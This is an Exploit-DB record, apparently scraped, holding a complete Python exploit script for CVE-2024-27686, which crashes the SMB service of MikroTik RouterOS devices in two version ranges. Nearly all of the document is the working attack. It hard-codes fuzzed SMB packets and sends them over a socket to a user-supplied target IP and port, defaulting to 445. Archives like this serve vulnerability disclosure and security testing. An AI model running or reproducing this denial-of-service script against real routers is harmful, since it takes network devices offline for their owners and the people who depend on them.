{"source": "https://www.exploit-db.com/exploits/51931", "vulnName": "RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10 - Denial of Service", "vulnEDBID": "51931", "vulnCVE": "N/A", "author": "ICE-WZL", "exploitType": "DOS", "platform": "HARDWARE", "datePublished": "2024-03-28", "vulnContent": "# Exploit Title: CVE-2024-27686: RouterOS-SMB-DOS\n# Google Dork: N/A\n# Date: 03/04/2024\n# Exploit Author: ice-wzl, Solstice Cyber Solutions\n# Vendor Homepage: https://mikrotik.com/\n# Software Link: https://mikrotik.com/download/archive\n# Version: RouterOS devices ranging from 6.40.5 - 6.44 and 6.48.1 - 6.49.10\n# Tested on: RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10\n# CVE : CVE-2024-27686\n#!/usr/bin/python3 \n# Founded by ice-wzl in conjunction with Solstice Cyber Solutions\nimport argparse\nimport sys\nimport socket \n# Define the packets\n\n# the packet that causes crash 6.40.5 - 6.42.3\nfuzzed_packet_6 = b'\\x00\\x00\\x00n\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\xf1\\x1f\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\xe1\\xbe\\x82\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00G\\xe5\\x07\\xf5\\x07\\xec\\x01u\\xe4Q]\\x9e\\xea\\xedn\\xa9\\t\\x00\\x00\\x00H\\x00&\\x00\\\\\\x00\\\\\\x001\\x009\\x002\\x00.\\x001\\x006\\x008\\x00.\\x001\\x005\\x00.\\x007\\x007\\x00\\\\\\x00p\\x00u\\x00b\\x00'\n\n\npacket_0 = b'\\x00\\x00\\x00\\xea\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$\\x00\\x05\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\xe8\\xe4*\\x99\\xc9\\xeb\\xb6E\\xa2A\\xe9(\\xee%\\xe5\\xdfp\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x02\\x02\\x10\\x02\\x00\\x03\\x02\\x03\\x11\\x03\\x00\\x00\\x01\\x00&\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00_\\xf7m\\xf2h*\\x8f\\x8ae\\x0f8+T=Na8_\\x0b@C\\x82\\xe7\\x87\\xc3qZ\\xd7\\xcf0M\\x87\\x00\\x00\\x02\\x00\\n\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x02\\x00\\x01\\x00\\x04\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x02\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x1a\\x00\\x00\\x00\\x00\\x001\\x009\\x002\\x00.\\x001\\x006\\x008\\x00.\\x001\\x005\\x00.\\x008\\x004\\x00'\npacket_2_fuzzed = b'\\x00\\x00\\x00\\xa2\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x19\\x00\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00X\\x00J\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00`H\\x05\\x06+\\x06\\x01\\x05\\x05\\x02\\xa0>0<\\xa0\\x0e21540373\\xed\\xba\\xad211\\x0c\\x06\\n+\\x06\\x01\\x04\\x01\\x82294517887446830\\x02\\x02\\n\\xa2*\\x04(NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x15\\x82\\x08b\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x06\\x01\\x00\\x00\\x00\\x00\\x00\\x0f'\n\n\ndef open_connection(ip, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((ip, port))\n        return s\n    except ConnectionRefusedError:\n        print(f\"[!] Connection Refused on: {ip} {port}\")\n        sys.exit(2)\n\ndef send_payload_high(s):\n    s.send(packet_0)\n    s.send(packet_2_fuzzed)\n    s.close()\n\ndef send_payload_low(s):\n    s.send(fuzzed_packet_6)\n    s.close()\n\ndef verify_input(user_inp):\n    try:\n        user_inp = int(user_inp)\n        if user_inp > 2 or user_inp < 1:\n            return 3\n        else:\n            return user_inp\n    except ValueError:\n        return 0\n\nif __name__ == '__main__':\n\n    parser = argparse.ArgumentParser(prog='SMB Crash',\n        description='Crashes Mikrotik RouterOS SMB Service 6.40.5 - 6.49.10',\n        epilog='Discovered by: ice-wzl')\n\n    parser.add_argument(\"-t\", \"--target\", action=\"store\", dest=\"target\")\n    parser.add_argument(\"-p\", \"--port\", action=\"store\", dest=\"port\")\n\n    args = parser.parse_args()\n    \n    if not args.target or not args.port:\n        print(f\"[+] python3 {sys.argv[0]} --help\")\n        sys.exit(1)\n\n    print(\"[+] What version is the target:\\n\\t[1] 6.40.5 - 6.44\\n\\t[2] 6.48.1 - 6.49.10\\nEnter 1 or 2:\")\n    version_choice = input(\"--> \")\n\n    if verify_input(version_choice) == 0:\n        print(\"Please enter a number...\")\n        sys.exit(3)\n    elif verify_input(version_choice) == 3:\n        print(\"Please enter a number between 1 and 2\")\n        sys.exit(4)\n\n    if verify_input(version_choice) == 1:\n        if args.port:\n            get_connect = open_connection(args.target, int(args.port))\n            send_payload_low(get_connect)\n            print(f\"[+] Sent DOS to {args.target} on {args.port}\")\n        else:\n            get_connect = open_connection(args.target, 445)\n            send_payload_low(get_connect)\n            print(f\"[+] Sent DOS to {args.target} on 445\")  \n    \n    if verify_input(version_choice) == 2:\n        if args.port:\n            get_connect = open_connection(args.target, int(args.port))\n            send_payload_high(get_connect)\n            print(f\"[+] Sent DOS to {args.target} on {args.port}\")\n\n        else:\n            get_connect = open_connection(args.target, 445)\n            send_payload_high(get_connect)\n            print(f\"[+] Sent DOS to {args.target} on 445\")\n            "}